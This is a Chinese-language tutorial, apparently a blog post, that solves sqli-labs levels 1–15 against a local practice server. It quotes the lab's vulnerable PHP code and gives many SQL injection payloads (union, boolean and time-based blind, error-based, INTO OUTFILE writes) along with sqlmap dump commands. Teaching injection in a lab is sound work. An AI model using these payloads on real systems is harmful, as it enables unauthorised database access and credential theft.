# SQLI_LABS攻击

**目录**

[TOC]











主要对sqli-labs 的深入学习

## 报错的处理方式

 [[问题解决方案]Illegal mix of collations for operation ‘UNION‘,_illegl mix of union_Gy-1-__的博客-CSDN博客](https://blog.csdn.net/YiQieFuCong/article/details/111290980) 

## Less1

我们先看看源代码

```php
<?php
//including the Mysql connect parameters.
include("../sql-connections/sql-connect.php");
error_reporting(0);
// take the variables 
if(isset($_GET['id']))
{
$id=$_GET['id'];
传参是原封不动的传参
//logging the connection parameters to a file for analysis.
$fp=fopen('result.txt','a');
fwrite($fp,'ID:'.$id."\n");
fclose($fp);
 
// connectivity 
 
 
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
这里是进行SQL注入的地方 而且没有进行过滤
$result=mysqli_query($con, $sql);
$row = mysqli_fetch_array($result, MYSQLI_BOTH);
 
        if($row)
        {
        echo "<font size='5' color= '#99FF00'>";
        echo 'Your Login name:'. $row['username'];
        echo "<br>";
        echo 'Your Password:' .$row['password'];
        echo "</font>";
        }
        else 
        {
        echo '<font color= "#FFFF00">';
        print_r(mysqli_error($con));
        echo "</font>";  
        }
}
        else { echo "Please input the ID as parameter with numeric value";}
 
?>
```

如果我们直接传入错误的



<img src="https://i-blog.csdnimg.cn/blog_migrate/965c5f7156fe03b2c927751444b7cc7a.png" alt="" style="max-height:237px; box-sizing:content-box;" />


因为我们可以直接在linux命令行中执行

```cobol
SELECT * FROM users WHERE id='$id' LIMIT 0,1;
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/ab252a8c256abbed67070dc407fc9861.png" alt="" style="max-height:128px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/08a01a3c52dc5924a74b34c5559334e7.png" alt="" style="max-height:205px; box-sizing:content-box;" />


发现是一样的

```cobol
SELECT * FROM users WHERE id='1' union select 1,2,3#' LIMIT 0,1 ;
```

我们尝试联合查询 union



<img src="https://i-blog.csdnimg.cn/blog_migrate/a0acffca8f56e40aa783361947a6a717.png" alt="" style="max-height:165px; box-sizing:content-box;" />


但是这个是因为第一条查询到了 然后返回第二条

我们如何只看第二条呢 只要让第一条找不到就可以了

```cobol
SELECT * FROM users WHERE id='-1' union select 1,2,3#' LIMIT 0,1 ;
```

这里只需要 将id设置为数据库不存在的即可



<img src="https://i-blog.csdnimg.cn/blog_migrate/f811b2c9b4eb61d58ed1f45fe31f3e3c.png" alt="" style="max-height:143px; box-sizing:content-box;" />


这里有一个很重要的问题

```cobol
我们先需要了解 union是 怎么查询的
 
SELECT column1, column2, ... FROM table1
UNION
SELECT column1, column2, ... FROM table2;
 
首先要保证两个查询的column数是一样的
 
假如
SELECT id, name, age FROM students WHERE id = 100
UNION
SELECT id, name, age FROM teachers WHERE id = 200;
 
 
但是没有 id=100的数据
 
但是，由于第二个 SELECT 查询的列数和数据类型与第一个查询的结果集相同
UNION 运算符会返回第二个 SELECT 查询的结果，只要它的 WHERE 子句中的条件满足。
 
因此，在使用 UNION 运算符组合两个 SELECT 查询时，只要它们的列数和数据类型相同
即使第一个查询没有返回结果，仍然可以返回第二个查询的结果。
```

这里就是我们最基本SQL注入的想法 通过第一个查询不到 然后和第二个查询 形成集合返回给我们

就只会返回第二个 因为第一个查找不到

所以我们可以开始做这道题目

```cobol
?id=1'
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/a081c0877c343743d490db56baf006e4.png" alt="" style="max-height:376px; box-sizing:content-box;" />


来判断是什么类型的 发现是字符型 因为一个单引号报错

```cobol
near ''1'' LIMIT 0,1' at line 1
这里会蒙

其实报错报错信息是
'1'' LIMIT 0,1
所以我们能够发现是字符型注入
```

我们先看看能不能构造万能密码

```cobol
?id=1' or 1=1 -- + 发现是可以的

select * from users where id ='1'or 1=1-- +'
 
 
真 or 真
 
 
就算我们使用假的也可以
 
select * from users where id ='-1'or 1=1-- +'


假 or 真
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/7c21ecaf1d8ffab16ee34b0819f5a889.png" alt="" style="max-height:282px; box-sizing:content-box;" />


这个在数据库里面是怎么查询的呢



<img src="https://i-blog.csdnimg.cn/blog_migrate/1d6ae287e067840708f39f29b688be1e.png" alt="" style="max-height:559px; box-sizing:content-box;" />


这样就很明显能发现 可以返回数据库里的内容了

### 首先来爆字段



```cobol
?id=1' order by 1-- +
?id=1' order by 2-- +
?id=1' order by 3-- +
?id=1' order by 4-- +
```





<img src="https://i-blog.csdnimg.cn/blog_migrate/97914e9df14817a8a76bd6aeb49c375f.png" alt="" style="max-height:245px; box-sizing:content-box;" />


发现字段为3



<img src="https://i-blog.csdnimg.cn/blog_migrate/84b452c5c82f89c0c5876acb262b772d.png" alt="" style="max-height:214px; box-sizing:content-box;" />


```cobol
order by  就是通过列来排列 默认是降序
 
这里是通过 order by 来判断字段
 
因为123 的时候有返回 
 
4就没有 说明就有3个字段
```

### 联合注入

我们猜完字段就可以使用 union来联合注入

```cobol
union的作用 
 
select 语句1 
union
select 语句2
 
union 会把两个select 语句 结果变为一个集合返回
 
如果1 报错 没有返回 就会返回2的结果
 
```

#### 判断注入点

首先我们看看哪里会回显

```cobol
/?id=-1' union select 1,2,3-- +
```

注意前面需要是错误的id



<img src="https://i-blog.csdnimg.cn/blog_migrate/eb013f4b012c6996a9a45c98abcb68fe.png" alt="" style="max-height:287px; box-sizing:content-box;" />


发现我们可以在 2 3 进行注入

### 爆数据库名

```cobol
?id=-1' union select 1,2,database()-- +
```

我们使用database()函数来爆破 数据库的名字

```scss
database()是一个Mysql函数 在查询语句的时候返回当前数据库的名字
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/91b9f12a6e68905b7dc8e6bc90ea49bc.png" alt="" style="max-height:198px; box-sizing:content-box;" />


这里我们就得到了数据名字

### 爆破表名

这里我们就需要了解一下其他的系统数据库和表

#### information_schema

是一个系统数据库   它包含了MySQL数据库中所有的元数据信息



<img src="https://i-blog.csdnimg.cn/blog_migrate/76de3cf1b14746814fcc459faec31b3d.png" alt="" style="max-height:817px; box-sizing:content-box;" />


#### information_schmea.tables

这里主要是值tables表



<img src="https://i-blog.csdnimg.cn/blog_migrate/51a1e51c9c024d1e8032b25790961d49.png" alt="" style="max-height:200px; box-sizing:content-box;" />




我们需要的数据库 security的信息也在里面

这个tables表可以查询到 数据库所有的表名和信息

所以我们可以继续写语句

```cobol
我们首先要了解要查什么
 
1.我们需要查数据库的表
 
2.数据库的表 存放在系统数据库的 information_schema.tables表中
 
3.在information_schema.tables中存在table_schema(数据库名) 、table_name（表名）
 
4.我们需要查询 information_schema.tables表中 的table_name（表名）  并且我们已知 table_schema(数据库名)
 
所以我们就可以写sql语句
```

```csharp
网站
?id=-1'union select 1,2,table_name from information_schema.tables where table_schema='security'-- +
 
 
数据库
 
select * from users where id='-1'union select 1,2,table_name from information_schema.tables where table_schema='security'-- +'
```





<img src="https://i-blog.csdnimg.cn/blog_migrate/acb64191cc1246af1dbec9e54e615775.png" alt="" style="max-height:300px; box-sizing:content-box;" />


这里只会返回 第三列 email的列名 因为 我们是在 3 的地方进行查询

这里就要使用其他的聚合函数

#### group_concat()

```cobol
我们要知道 group_concat()
 
是通过将返回值 作为一个字符串返回的函数
 
很好理解
 
table_name from  information_schema.tables
 
这里 返回的table_name假设是  a b c 这里是3个返回值
 
group_concat(table_name) from  information_schema.tables
 
加上聚合函数返回的就是 "a b c"  变为了1个返回值
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/17fc49852fd4d525c1c345651c7740e9.png" alt="" style="max-height:317px; box-sizing:content-box;" />


从这里就可以看出来 只在3 返回了 并且返回的是一个字符串（所有的列名合为一个）

```csharp
网站
 
?id=-1'union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'-- +
 
数据库
 
select * from users where id='-1'union select 1,2,GROUP_CONCAT(table_name) from information_schema.tables where table_schema='security'-- +'
```

这里我们就得到了表名 现在 就可以选择一个表名进行查看

### 爆破列名

这里也是要用到我们的系统数据库

#### information_schema.columns



这个是 系统数据库的字段表

存放着每个数据库的字段信息



<img src="https://i-blog.csdnimg.cn/blog_migrate/8ef80cc83c55818db80c86d60a1d2103.png" alt="" style="max-height:273px; box-sizing:content-box;" />




```cobol
1.我们需要确定我们查询的是什么表
 
2.我们需要的是表的字段名
 
3.通过information_schema.columns 可以查询字段名
 
4.要求是要知道 表名是什么
 
 
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/12f65e92f979d359c41fc726e1926ee9.png" alt="" style="max-height:69px; box-sizing:content-box;" />


其中的table_name 就是我们知道的信息（表名）

column_name就是我们需要查询的信息（字段名）

假设我们需要查询的是users表

```cobol
select * from users where id='-1'union select 1,2,GROUP_CONCAT(column_name) from information_schema.columns where TABLE_NAME='users'-- +'
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/966d8ef59dc571c90da3c615846ecf3d.png" alt="" style="max-height:425px; box-sizing:content-box;" />


这里就是返回了users的所有字段名



<img src="https://i-blog.csdnimg.cn/blog_migrate/8abdf6dfc4558ff71ef8c3205c8c2369.png" alt="" style="max-height:260px; box-sizing:content-box;" />


这里返回了一些不是表中的字段

USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS

这是为什么呢

```bash
因为我们在写语句的时候 没有指定数据库 只指定了users
 
我们不排除其他地方也存在users 的表
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/78f9e08025c4f82e759b3073029e6f8c.png" alt="" style="max-height:189px; box-sizing:content-box;" />


很显然 还有其他数据的表的字段也返回了

这个时候我们只需要加入一个and 即可

```csharp
?id=-1'union select 1,2,GROUP_CONCAT(column_name) from information_schema.columns where table_schema='security' and TABLE_NAME='users'-- +
```

### 爆值

```csharp
?id=-1'union select 1,2,GROUP_CONCAT(id,'--------',username,'--------',password) from security.users-- +
```

因为我们知道了所有的信息 所以爆值就很快

通过字段 然后选择 数据库.表名 即可得出值来

这个时候就很简单取得值即可



<img src="https://i-blog.csdnimg.cn/blog_migrate/bdf76bf1773ac7ed8b8600a0f52ccfcd.png" alt="" style="max-height:356px; box-sizing:content-box;" />


### SQLMAP



开启mysql 和apache服务

保证 靶场搭建

```sql
sqlmap -u "http://127.0.0.1/sqli-labs/Less-1/?id=1" --tables
这个会返回所有的数据库和数据库的表
```





<img src="https://i-blog.csdnimg.cn/blog_migrate/b42a866644ddfdb21d2afea96059562d.png" alt="" style="max-height:159px; box-sizing:content-box;" />


我们确定了数据库和表就可以直接来爆破字段

```sql
sqlmap -u "http://127.0.0.1/sqli-labs/Less-1/?id=1" -D security -T users --columns 
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/59282e807ea62613f79cb917bb3cec7e.png" alt="" style="max-height:247px; box-sizing:content-box;" />


我们就可以直接得出值

```perl
sqlmap -u "http://127.0.0.1/sqli-labs/Less-1/?id=1" -D security -T users --dump
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/af6ea1938d6f5787666e09ed47486cb0.png" alt="" style="max-height:316px; box-sizing:content-box;" />


## Less-2 -4

差不多 注入即可

## Less -5 布尔

```cobol
id=1
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/1845c59a4d42c565fae8ef765f0b7e71.png" alt="" style="max-height:318px; box-sizing:content-box;" />




```cobol
id=1'
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/47474e04eb129e53ce232efd455f28e0.png" alt="" style="max-height:350px; box-sizing:content-box;" />


我们看看能不能直接爆字段



<img src="https://i-blog.csdnimg.cn/blog_migrate/f8efb64b3761456ba8e4d75c3c769e0c.png" alt="" style="max-height:218px; box-sizing:content-box;" />


发现是可以的

但是这里不能使用联合注入 因为真 只会返回 You are in的页面

错误就返回什么都没有的页面

我们这个时候可以通过逻辑判断来猜

### 数据库

```matlab
?id=1' and length((select database()))>7 -- +
 
这个解释
 
先通过 (select database()) 来查询数据库
 
然后放入 length(数据库的字符串) 来判断长度
 
通过后面的判断来猜测长度 
```

也可以使用其他的逻辑

```csharp
?id=1' and length((select database()))=8 -- +
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/feb46253c2f42509585909a2185cbf9b.png" alt="" style="max-height:347px; box-sizing:content-box;" />


这里就确定了 数据库名的长度为8

这个时候就需要另一个函数了 ascii() 和substr()

这个作用就是切片和转为ascii 然后对ascii进行对比就可以爆破出数据库

```scss
SUBSTR(要切片的字符串, 从什么时候开始, 切多少)
```

我们可以开始构造

```csharp
id=1' and ascii(substr((select database()),1,1))=115 -- +
```

这里 我们就可以通过二分法 判断 ascii的值为115



<img src="https://i-blog.csdnimg.cn/blog_migrate/e237b5ac3e8b66720adceda83e93048f.png" alt="" style="max-height:89px; box-sizing:content-box;" />


为s

然后就可以一个一个爆破出来

这样数据库就爆破完成

接着我们就可以开始爆破表了

### 表名

```csharp
/?id=1' and length((select group_concat(table_name) from information_schema.tables where table_schema='security'))=29-- +
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/e6709021adf2d92132cd4cdf2b5af0d2.png" alt="" style="max-height:392px; box-sizing:content-box;" />


说明有 这个字符串长度为29

然后我们就可以开始一个一个爆破

```csharp
?id=1' and ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema='security'),1,1))=101-- +
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/38478e1fbdc248fe20028a2efdfcbd76.png" alt="" style="max-height:185px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/cd8cd5025c86855399d1724803255021.png" alt="" style="max-height:85px; box-sizing:content-box;" />


第二位

```csharp
?id=1' and ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema='security'),2,1))=109-- +
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/802bf450070fd7b7f831317555a38564.png" alt="" style="max-height:313px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/7a890f3682fbc9628ab5a57c2c6da321.png" alt="" style="max-height:74px; box-sizing:content-box;" />


一个一个爆破即可

### 字段名

```csharp
/?id=1' and length((select group_concat(column_name)from information_schema.columns where table_name='users' and table_schema=database()))=20-- +
```

长度为20

开始猜

```csharp
?id=1' and ascii(substr((select group_concat(column_name)from information_schema.columns where table_name='users' and table_schema=database()),1,1))=105 -- +
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/5c00082786a404afec8e83b4dd8f9964.png" alt="" style="max-height:376px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/642c5b709a516385f6652aca068c24e7.png" alt="" style="max-height:83px; box-sizing:content-box;" />




```csharp
?id=1' and ascii(substr((select group_concat(column_name)from information_schema.columns where table_name='users' and table_schema=database()),2,1))=100 -- +
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/70be1217b3e6063e45943c7d47fd0c13.png" alt="" style="max-height:281px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/196cc1721b4458997509b936de0f5ce4.png" alt="" style="max-height:92px; box-sizing:content-box;" />


### 爆破值

猜测长度

```csharp
?id=1' and length((select group_concat(id,username,password) from security.users))=192-- +
```

猜测ascii

第一个

```csharp
?id=1' and ascii(substr((select group_concat(id,username,password) from security.users),1,1))=49 -- +
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/1cf7899b1e653489a8316a567bff0624.png" alt="" style="max-height:185px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/81cd1255bc005e788dc64b41393ed9fb.png" alt="" style="max-height:94px; box-sizing:content-box;" />


第二个



```csharp
?id=1' and ascii(substr((select group_concat(id,username,password) from security.users),2,1))=68 -- +
```





<img src="https://i-blog.csdnimg.cn/blog_migrate/3447dacba2ef590ea03fc0c11e54c5cc.png" alt="" style="max-height:228px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/e7632de635d1daa10e01334d10ec712b.png" alt="" style="max-height:85px; box-sizing:content-box;" />


这样就可以一步一步爆破出来 但是时间很久 所以使用脚本或者sqlmap是遇到布尔的解决方式之一

### SQLMAP

```sql
sqlmap -u "http://127.0.0.1/sqli-labs/Less-5/?id=1'" --dbs
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/f9126fac4778de056995ec15e95b40ba.png" alt="" style="max-height:94px; box-sizing:content-box;" />




security

```sql
sqlmap -u "http://127.0.0.1/sqli-labs/Less-5/?id=1'" -D security --tables 
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/3d0a69889386d410a634f4f664b49764.png" alt="" style="max-height:178px; box-sizing:content-box;" />


```sql
sqlmap -u "http://127.0.0.1/sqli-labs/Less-5/?id=1'" -D security -T users --columns
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/e033af52fdf79599c67808e130ad9553.png" alt="" style="max-height:195px; box-sizing:content-box;" />




```perl
sqlmap -u "http://127.0.0.1/sqli-labs/Less-5/?id=1'" -D security -T users --dump
```





<img src="https://i-blog.csdnimg.cn/blog_migrate/05c4f78d11938c926678ec7a36803227.png" alt="" style="max-height:337px; box-sizing:content-box;" />


## Less-6

判断注入类型

```cobol
id=1"
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/4348f6feac0076c186faa7686973e714.png" alt="" style="max-height:284px; box-sizing:content-box;" />


数据长度

```cobol
?id=1" and length((select database()))=8-- +
```

爆数据名

```cobol
s
/?id=1" and ascii(substr((select database()),1,1))=115-- +

e
?id=1" and ascii(substr((select database()),2,1))=101-- +
.....
 
 
```

最后得到 security

表的长度

```cobol
/?id=1" and length((select group_concat(table_name)from information_schema.tables where table_schema='security'))=29-- +
```

猜表名

```cobol
e
?id=1" and%20 ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema='security'),1,1))=101 -- +

m
?id=1" and%20 ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema='security'),2,1))=109 -- +
```

最后得到了

emails,referers,uagents,users

猜字段长度

```cobol
?id=1"and length((select group_concat(column_name)from information_schema.columns where table_name='users' and table_schema='security'))=20 -- +
```

猜字段名字

```cobol
i
/?id=1" and%20 ascii(substr((select group_concat(column_name)from information_schema.columns where table_name='users' and table_schema='security'),1,1))=105 -- +

d
/?id=1" and%20 ascii(substr((select group_concat(column_name)from information_schema.columns where table_name='users' and table_schema='security'),2,1))=100 -- +
```

id,username,password

猜测值的长度

```cobol
?id=1" and length((select group_concat(id,username,password)from security.users))=192 -- +
```

猜值的字符串

```cobol
1
?id=1" and ascii(substr((select group_concat(id,username,password)from security.users),1,1))=49 -- +
D
?id=1" and ascii(substr((select group_concat(id,username,password)from security.users),2,1))=68 -- +
```

最后就得出来了

## Less-7

### 这个题目使用布尔注入可以

进行闭合的判断

```cobol
1"))and 1=2-- +

ture 说明不是闭合

?id=1'))and 1=2-- +

false

说明是闭合
```

判断出是闭合后

直接进行布尔注入

```csharp
?id=1')) and length((select database()))=8-- +
```

### outfile

outfile是mysql通过搜索值导出到本地的一个指令

我们可以进行尝试





```swift
?id=-1')) union select 1,2,(select database()) into outfile%20 "D:\\phpstudy_pro\\WWW\\sqli-labs\\Less-7\\1.txt"-- +
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/77df6b8d45305e4aea01f195be6333f6.png" alt="" style="max-height:230px; box-sizing:content-box;" />


发生报错 但是我们去看看我们的路径下是否存在 1.txt



<img src="https://i-blog.csdnimg.cn/blog_migrate/1bca3c8fb8ea71f9215b365d44c6a6fe.png" alt="" style="max-height:175px; box-sizing:content-box;" />


发现存在



<img src="https://i-blog.csdnimg.cn/blog_migrate/df04f6f5b573f43b57d792ddb8b1a196.png" alt="" style="max-height:85px; box-sizing:content-box;" />


内容就是我们需要的

这样我们就可以直接一步一步报出来

```cobol
?id=-1%27))%20union%20select%201,2,(select%20group_concat(table_name)from%20information_schema.tables%20where%20table_schema=database())%20into%20outfile%20%22D:\\phpstudy_pro\\WWW\\sqli-labs\\Less-7\\2.txt%22--%20+
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/e223bde0b2fa2d763c771af1f5f4e23c.png" alt="" style="max-height:100px; box-sizing:content-box;" />




```cobol
?id=-1%27))%20union%20select%201,2,(select%20group_concat(column_name)from%20information_schema.columns%20where%20table_name=%27users%27%20and%20table_schema=database())%20into%20outfile%20%22D:\\phpstudy_pro\\WWW\\sqli-labs\\Less-7\\3.txt%22--%20+
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/8358a668ad359b13f3f0072c3cacb07b.png" alt="" style="max-height:78px; box-sizing:content-box;" />




```cobol
?id=-1%27))%20union%20select%201,2,(select%20group_concat(id,%27-----------%27,username,%27-----------%27,password)from%20security.users)%20into%20outfile%20%22D:\\phpstudy_pro\\WWW\\sqli-labs\\Less-7\\4.txt%22--%20+
```





<img src="https://i-blog.csdnimg.cn/blog_migrate/64ba6f0d94b24bac004f8c578c0f771f.png" alt="" style="max-height:137px; box-sizing:content-box;" />


到这里 就结束了

## Less-8

这题和第七题一样

布尔注入 outfile都可以

类型就是 1'

## Less-9 时间注入

这道题目 我们无论输入什么 都是返回 you are in

这个时候 不能使用有回显的注入了

因为他们无论有没有回显 都是回显 you are in

这个时候我们使用时间注入

时间注入 是在 布尔注入的基础上 加上了 if 和 sleep

```scss
if(查询语句,sleep(10),1)
 
 
通过这个我们就可以实现时间注入
 
如果 查询语句为真 就执行 sleep(10)
 
否则 执行 1
```

我们直接进行尝试

先判断闭合



```cobol
?id=1' and if(1=1,sleep(10),1)-- +
```





<img src="https://i-blog.csdnimg.cn/blog_migrate/9e6bbddbee25fc1b1f86e56019f7f29c.png" alt="" style="max-height:92px; box-sizing:content-box;" />


发现确实 加载了10秒 所以 类型就是字符 然后闭合为 1'

可以开始判断 数据库长度

这里不需要才字段数 因为是以布尔注入为基础

直接一位一位爆

猜字段数是因为 union的需要

```cobol
数据库长度
?id=1' and if(length((select database()))=8,sleep(5),1)-- +
为 8 

爆破数据库第一个字符
?id=1' and if(ascii(substr((select database()),1,1))=115,sleep(5),1)-- +
为s
 
最后得到数据库security
 
爆破表的长度
/?id=1' and if(length((select group_concat(table_name)from information_schema.tables where table_schema='security'))=29,sleep(5),1)-- +

为29

爆破表的第一个字符
?id=1' and if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema='security'),1,1))=101,sleep(5),1)-- +
 
为e
 
最后爆破出来emails,referers,uagents,users
 
爆破字段的长度
?id=1' and if(length((select group_concat(column_name)from information_schema.columns where table_name='users' and table_schema=database()))=20,sleep(5),1)-- +

为20

爆破字段的第一个字符
?id=1' and if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name='users' and table_schema=database()),1,1))=105,sleep(5),1)-- +
 
为i
 
最后为 id,username,password 
 
爆破值的长度
?id=1' and if(length((select group_concat(id,username,password)from security.users))=192,sleep(5),1)-- +

长度为192

开始爆破值
?id=1' and if(ascii(substr((select group_concat(id,username,password)from security.users),1,1))=49,sleep(5),1)-- +
 
最后爆破为
1DumbDumb,2AngelinaI-kill-you,3Dummyp@ssword,4securecrappy,5stupidstupidity,6supermangenious,7batmanmob!le,8adminadmin,9admin1admin1,10admin2admin2,11admin3admin3,12dhakkandumbo,14admin4admin4
```

这样时间注入就实现了

但是花费时间精力巨大 还是推荐sqlmap跑一下



## Less-10

```cobol
?id=1" and if(1=1,sleep(5),1)-- +
```

判断完字符类型

就和前面一样了

一样的 outfile 也可以使用 但是首先无法猜测字段 所以也就没有办法了

并且正常情况下无法知道 绝对路径

## Less-11



<img src="https://i-blog.csdnimg.cn/blog_migrate/66a426d989d90c13002637d462672451.png" alt="" style="max-height:267px; box-sizing:content-box;" />


变为了Post类型

我们可以选择在 账号 或者密码进行注入

首先进行尝试万能密码

```cobol
1 or 1=1-- + 整型
 
1' or 1=1 -- + 字符

这个既可以看看能不能进入后台 又可以看看是什么类型的闭合
```

### 万能密码原理

```cobol
select * from user where id='1' or  1=1-- +'
```

最后得到

```vbnet
1' or 1=1 -- + 
```

开始使用联合注入

```cobol
猜字段
1' order by 3-- +

得到两个字段

查看回显
1' union select 1,2-- +
 
得到 1,2都可以回显
 
查看数据库名
1' union select 1,database()-- +

得到security

查看表名
1' union select 1,group_concat(table_name)from information_schema.tables where table_schema=database()-- +
 
得到emails,referers,uagents,users
 
查看字段名
1' union select 1,group_concat(column_name)from information_schema.columns where table_schema=database() and table_name='users'-- +

得到id,username,password

查看值
1' union select 1,group_concat(id,'-------',username,'--------',password)from security.users -- +
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/54faa81aab846553a84e566973136c1c.png" alt="" style="max-height:206px; box-sizing:content-box;" />


## Less-12

通过报错判断

然后结合万能密码

```cobol
1") or 1=1 -- +
```

正常注入即可

```scss
1") union select 1,group_concat(id,'-------',username,'--------',password)from security.users -- +
```

## Less-13 报错注入 updatexml()

判断闭合

```vbnet
1') or 1=1 -- +
```

这道题 回显 只有两个 一个是正确 一个是错误 所以应该可以使用布尔注入

### 布尔注入

```csharp
1') or length((select database()))=8-- +
```

这里和之前不一样

之前是

```csharp
1') and length((select database()))=8-- +
```

因为首先我们无法得到username和password 所以第一个就是假

如果要让语句为真 就要用

假 or 真 = 真

然后就通过 ascii() substr() length() 交替爆破即可

### 报错注入

这里还可以使用另一个方式 报错注入

通过

updatexml() concat()函数来实现

```scss
updatexml()
 
这个和我们查询没什么关系 
主要是
 
updatexml(1,2,3)
当第二个参数2为一个特殊符号的时候 就会返回报错
 
这个函数原本是用来更新xml值的
 
 
updatexml(需要更新的xml文档,xpath表达式,替换的值）
 
在 xpath表达式写入特殊符号 这样就不是返回mysql的报错
 
而是返回 xpath的错误 
 
这个时候要知道另一个函数 concat()
 
就是把两个字符串 合并
concat("hello","world")
 
为helloworld
 
这个时候 通过 updatexml(1,concat(0x7e,查询语句),3)
 
就可以合并返回报错信息
 
其中 concat()内容可以是任何数据类型
```

所以我们可以直接开始报错注入

### 查看是不是报错注入

```vbnet
1') and updatexml(1,0x7e,3)-- +
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/4b30424d2fc3776d6ebfa4f0afd9e3c0.png" alt="" style="max-height:124px; box-sizing:content-box;" />


### 爆数据库



```vbnet
1') and updatexml(1,concat(0x7e,database()),3)-- +
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/6c14cb156adcd189a9bb35cb0f7a5d80.png" alt="" style="max-height:107px; box-sizing:content-box;" />


### 爆破表名

```csharp
1') and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())),3)-- +
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/8755da76abe57f167edbc56379452bc8.png" alt="" style="max-height:176px; box-sizing:content-box;" />


### 爆破表名

```csharp
1') and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_schema=database() and table_name='users')),3)-- +
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/20a4fca94912a5921068ae4572456569.png" alt="" style="max-height:127px; box-sizing:content-box;" />


### 爆破字段名

```csharp
1') and updatexml(1,concat(0x7e,(select group_concat(id,'-------',username,'------',password)from security.users)),3)-- +
```

但是这个时候出现了 新的情况

### 报错的长度受限制

这个时候 我们就可以使用substr 或者limit

#### substr

```csharp
1') and updatexml(1,concat(0x7e,substr((select group_concat(id,'-------',username,'------',password)from security.users),15,31)),3)-- +
```

#### limit

注意 limit 需要使用 concat() 而不是group_concat()

```csharp
1') and updatexml(1,concat(0x7e,(select concat(username,password) from security.users  limit 0,1),0x7e),1)
```

### concat()和group_concat()

concat()



<img src="https://i-blog.csdnimg.cn/blog_migrate/296a1b60b8515c1effb8fbe194bdfffb.png" alt="" style="max-height:339px; box-sizing:content-box;" />


group_concat()



<img src="https://i-blog.csdnimg.cn/blog_migrate/71a197b3a7f647f22961703b190bbe21.png" alt="" style="max-height:172px; box-sizing:content-box;" />


### 所以只有concat()才可以 limit

报错注入 还不只有这些 在后面的题继续给出

## Less-14 报错注入 extractvalue()

首先我们要先了解这个函数是什么

```scss
extractvalue(xml字符串，xpath表达式)
 
这个和updatexml一样 都是通过xpath表达式的报错 
 
来实现报错注入
```

这个我们理解后 就可以直接开始了

判断闭合

```cobol
1" or 1=1-- +
```

发现只有 成功和失败 这里就布尔注入

但是我们看看能不能报错注入

```scss
1" or extractvalue(1,0x7e)-- +
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/0e91220b9a8707963be03003e3d53f82.png" alt="" style="max-height:170px; box-sizing:content-box;" />


发现存在了

那我们就开始

爆破数据库

```scss
1" or extractvalue(1,concat(0x7e,(select database())))-- +
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/7506c5931452f521212f42e9b25b0770.png" alt="" style="max-height:127px; box-sizing:content-box;" />


爆破表

```cobol
1" or extractvalue(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema='security')))-- +
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/59db871a15168f3fc94d1284b0860b14.png" alt="" style="max-height:222px; box-sizing:content-box;" />


爆破字段

```cobol
1" or extractvalue(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name='users' and table_schema=database())))-- +
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/84e13fc06d3203fe7696380c6f569c35.png" alt="" style="max-height:166px; box-sizing:content-box;" />


爆破值

```scss
1" or extractvalue(1,concat(0x7e,(select concat(id,username,password)from security.users limit 0,1)))-- +
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/b26b98fadd2a65faf40c6813a76acd50.png" alt="" style="max-height:128px; box-sizing:content-box;" />


最后修改 limit x,1即可

## Less-15 post类型的sqlmap

发现没有任何报错信息 只有成功和失败 那么就是 布尔注入

```vbnet
1' or 1=1-- +
```

那么就可以使用length()->ascii()->substr()来实现布尔注入

这里主要演示 POST类型的SQLMAP

首先输入账号密码（随便）进行抓包



<img src="https://i-blog.csdnimg.cn/blog_migrate/5c71413b4cde651e41592afe27143ed7.png" alt="" style="max-height:390px; box-sizing:content-box;" />




